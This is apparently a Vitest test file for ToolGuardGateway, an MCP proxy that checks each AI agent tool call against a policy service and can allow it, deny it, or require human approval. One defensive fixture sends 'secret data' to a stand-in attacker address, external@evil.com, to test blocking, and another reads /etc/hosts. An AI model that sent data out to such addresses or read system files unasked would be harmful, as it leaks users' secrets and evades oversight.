/**
 * Tests for ToolGuardGateway — the real class, not a reimplementation.
 *
 * Each test instantiates the actual ToolGuardGateway from gateway.ts,
 * injects a mock ToolGuard client and in-memory transports, and connects
 * a test MCP Client to exercise the full code path: capability mirroring,
 * handler registration, tool call authorization, session management, and
 * passthrough behavior.
 */
import { describe, it, expect, vi, afterEach } from "vitest";
import { Server } from "@modelcontextprotocol/sdk/server";
import { Client } from "@modelcontextprotocol/sdk/client";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
} from "@modelcontextprotocol/sdk/types.js";
import { ToolGuardGateway } from "../src/gateway.js";
import type { GatewayConfig } from "../src/types.js";

// ---------------------------------------------------------------------------
// Helpers: upstream MCP server (simple in-memory server with one tool)
// ---------------------------------------------------------------------------

function createUpstreamServer() {
  const server = new Server(
    { name: "test-upstream", version: "1.0.0" },
    { capabilities: { tools: { listChanged: false } } },
  );

  server.setRequestHandler(ListToolsRequestSchema, async () => ({
    tools: [
      {
        name: "read_file",
        description: "Read a file from disk",
        inputSchema: {
          type: "object" as const,
          properties: { path: { type: "string" } },
          required: ["path"],
        },
      },
      {
        name: "send_email",
        description: "Send an email",
        inputSchema: {
          type: "object" as const,
          properties: { to: { type: "string" }, body: { type: "string" } },
          required: ["to", "body"],
        },
      },
    ],
  }));

  server.setRequestHandler(CallToolRequestSchema, async (request) => ({
    content: [
      {
        type: "text" as const,
        text: JSON.stringify({
          executed: request.params.name,
          args: request.params.arguments,
        }),
      },
    ],
  }));

  return server;
}

// ---------------------------------------------------------------------------
// Helpers: mock ToolGuard client
// ---------------------------------------------------------------------------

function createMockToolGuard(
  decision: "allow" | "deny" | "require_approval" = "allow",
) {
  return {
    createSession: vi.fn().mockResolvedValue({ id: "sess_test_123" }),
    authorize: vi.fn().mockResolvedValue({
      decision,
      reasonCodes: decision === "deny" ? ["POLICY_DENIED"] : [],
      approvalId: decision === "require_approval" ? "apr_test_456" : null,
      policyVersionId: null,
      matchedRuleIndex: null,
      approvalStatus: null,
      limits: {
        remainingActionsToday: 100,
        remainingBudgetUsd: 50,
        remainingToolActionsToday: 100,
        remainingTokensToday: 10000,
      },
    }),
  };
}

// ---------------------------------------------------------------------------
// Helpers: wire up the real ToolGuardGateway with in-memory transports
// ---------------------------------------------------------------------------

const defaultConfig: GatewayConfig = {
  toolguard: {
    baseUrl: "http://localhost:3000",
    orgId: "org_test",
    agentId: "agent_test",
  },
  session: {
    environment: "production",
    scopes: ["*"],
  },
};

async function createTestHarness(opts: {
  mockTg: ReturnType<typeof createMockToolGuard>;
  config?: Partial<GatewayConfig>;
}) {
  const config: GatewayConfig = {
    ...defaultConfig,
    ...opts.config,
    toolguard: { ...defaultConfig.toolguard, ...opts.config?.toolguard },
    session: { ...defaultConfig.session, ...opts.config?.session },
  };

  // 1. Start upstream MCP server on one side of an in-memory transport
  const upstreamServer = createUpstreamServer();
  const [upstreamClientSide, upstreamServerSide] =
    InMemoryTransport.createLinkedPair();
  await upstreamServer.connect(upstreamServerSide);

  // 2. Create the real ToolGuardGateway with injected ToolGuard client
  const gateway = new ToolGuardGateway(
    config,
    { command: "unused" }, // not used when transport is injected
    { toolguardClient: opts.mockTg as never },
  );

  // 3. Create client-facing in-memory transport
  const [testClientSide, gatewaySide] = InMemoryTransport.createLinkedPair();

  // 4. Start the real gateway with injected transports
  await gateway.start({
    upstreamTransport: upstreamClientSide,
    clientTransport: gatewaySide,
  });

  // 5. Connect test client
  const testClient = new Client(
    { name: "test-client", version: "1.0.0" },
    {},
  );
  await testClient.connect(testClientSide);

  return {
    client: testClient,
    gateway,
    cleanup: async () => {
      await testClient.close();
      await gateway.close();
      await upstreamServer.close();
    },
  };
}

// ---------------------------------------------------------------------------
// Tests — all exercise the real ToolGuardGateway class
// ---------------------------------------------------------------------------

describe("ToolGuardGateway", () => {
  let cleanup: () => Promise<void>;

  afterEach(async () => {
    if (cleanup) await cleanup();
  });

  it("mirrors upstream capabilities and passes through tools/list", async () => {
    const mockTg = createMockToolGuard("allow");
    const harness = await createTestHarness({ mockTg });
    cleanup = harness.cleanup;

    const result = await harness.client.listTools();
    expect(result.tools).toHaveLength(2);
    expect(result.tools.map((t) => t.name)).toContain("read_file");
    expect(result.tools.map((t) => t.name)).toContain("send_email");
  });

  it("forwards allowed tool calls to upstream server", async () => {
    const mockTg = createMockToolGuard("allow");
    const harness = await createTestHarness({ mockTg });
    cleanup = harness.cleanup;

    const result = await harness.client.callTool({
      name: "read_file",
      arguments: { path: "/etc/hosts" },
    });

    // Upstream executed the tool and returned its result
    const text = (result.content as Array<{ type: string; text: string }>)[0]
      .text;
    const parsed = JSON.parse(text);
    expect(parsed.executed).toBe("read_file");
    expect(parsed.args.path).toBe("/etc/hosts");
    expect(result.isError).toBeFalsy();

    // ToolGuard authorize was called with correct parameters
    expect(mockTg.authorize).toHaveBeenCalledWith(
      expect.objectContaining({
        sessionId: "sess_test_123",
        tool: { name: "read_file" },
        payloadSummary: { path: "/etc/hosts" },
      }),
    );
  });

  it("blocks denied tool calls with reason codes", async () => {
    const mockTg = createMockToolGuard("deny");
    const harness = await createTestHarness({ mockTg });
    cleanup = harness.cleanup;

    const result = await harness.client.callTool({
      name: "send_email",
      arguments: { to: "external@evil.com", body: "secret data" },
    });

    const text = (result.content as Array<{ type: string; text: string }>)[0]
      .text;
    expect(text).toContain("denied by policy");
    expect(text).toContain("POLICY_DENIED");
    expect(result.isError).toBe(true);
  });

  it("returns approval-required status with approval ID", async () => {
    const mockTg = createMockToolGuard("require_approval");
    const harness = await createTestHarness({ mockTg });
    cleanup = harness.cleanup;

    const result = await harness.client.callTool({
      name: "send_email",
      arguments: { to: "user@example.com", body: "update" },
    });

    const text = (result.content as Array<{ type: string; text: string }>)[0]
      .text;
    expect(text).toContain("requires human approval");
    expect(text).toContain("apr_test_456");
    expect(result.isError).toBe(true);
  });

  it("applies toolMapping before sending to ToolGuard", async () => {
    const mockTg = createMockToolGuard("allow");
    const harness = await createTestHarness({
      mockTg,
      config: {
        toolMapping: { read_file: "filesystem.read" },
      },
    });
    cleanup = harness.cleanup;

    await harness.client.callTool({
      name: "read_file",
      arguments: { path: "/tmp/test" },
    });

    // ToolGuard received the mapped name, not the MCP name
    expect(mockTg.authorize).toHaveBeenCalledWith(
      expect.objectContaining({
        tool: { name: "filesystem.read" },
      }),
    );
  });

  it("creates session lazily on first tool call, reuses thereafter", async () => {
    const mockTg = createMockToolGuard("allow");
    const harness = await createTestHarness({ mockTg });
    cleanup = harness.cleanup;

    // First call — session created
    await harness.client.callTool({
      name: "read_file",
      arguments: { path: "/a" },
    });
    expect(mockTg.createSession).toHaveBeenCalledTimes(1);

    // Second call — session reused
    await harness.client.callTool({
      name: "read_file",
      arguments: { path: "/b" },
    });
    expect(mockTg.createSession).toHaveBeenCalledTimes(1);
    expect(mockTg.authorize).toHaveBeenCalledTimes(2);
  });

  it("passes session config (environment, scopes, userId) to createSession", async () => {
    const mockTg = createMockToolGuard("allow");
    const harness = await createTestHarness({
      mockTg,
      config: {
        session: {
          environment: "staging",
          scopes: ["fs:read", "email:send"],
          userId: "user_42",
        },
      },
    });
    cleanup = harness.cleanup;

    await harness.client.callTool({
      name: "read_file",
      arguments: { path: "/test" },
    });

    expect(mockTg.createSession).toHaveBeenCalledWith({
      environment: "staging",
      scopes: ["fs:read", "email:send"],
      userId: "user_42",
    });
  });

  it("returns structured error when authorize throws", async () => {
    const mockTg = createMockToolGuard("allow");
    mockTg.authorize.mockRejectedValue(new Error("connect ECONNREFUSED"));
    const harness = await createTestHarness({ mockTg });
    cleanup = harness.cleanup;

    const result = await harness.client.callTool({
      name: "read_file",
      arguments: { path: "/test" },
    });

    const text = (result.content as Array<{ type: string; text: string }>)[0]
      .text;
    expect(text).toContain("authorization failed");
    expect(text).toContain("ECONNREFUSED");
    expect(result.isError).toBe(true);
  });

  it("returns structured error when session creation fails", async () => {
    const mockTg = createMockToolGuard("allow");
    mockTg.createSession.mockRejectedValue(new Error("401 Unauthorized"));
    const harness = await createTestHarness({ mockTg });
    cleanup = harness.cleanup;

    const result = await harness.client.callTool({
      name: "read_file",
      arguments: { path: "/test" },
    });

    const text = (result.content as Array<{ type: string; text: string }>)[0]
      .text;
    expect(text).toContain("session creation failed");
    expect(text).toContain("401 Unauthorized");
    expect(result.isError).toBe(true);
  });

  it("throws on construction when TOOLGUARD_API_KEY is missing and no client injected", () => {
    const originalKey = process.env.TOOLGUARD_API_KEY;
    delete process.env.TOOLGUARD_API_KEY;

    try {
      expect(
        () =>
          new ToolGuardGateway(defaultConfig, { command: "echo" }),
      ).toThrow("TOOLGUARD_API_KEY environment variable is required");
    } finally {
      if (originalKey !== undefined) {
        process.env.TOOLGUARD_API_KEY = originalKey;
      }
    }
  });
});
